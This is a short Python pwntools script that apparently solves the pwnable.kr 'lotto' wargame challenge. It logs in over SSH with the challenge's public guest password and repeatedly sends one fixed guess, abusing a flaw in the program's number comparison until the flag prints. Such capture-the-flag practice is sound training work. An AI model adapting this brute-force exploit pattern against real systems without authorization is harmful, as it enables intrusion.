from pwn import *

sh = ssh('lotto', 'pwnable.kr', password='guest', port=2222)
p = sh.process('./lotto')

for i in range(1000):
	p.recv()
	p.sendline('1')
	p.recv()
	p.sendline('------')
	_ , ans = p.recvlines(2)
	if b"bad" not in ans:
		print(ans)
		break

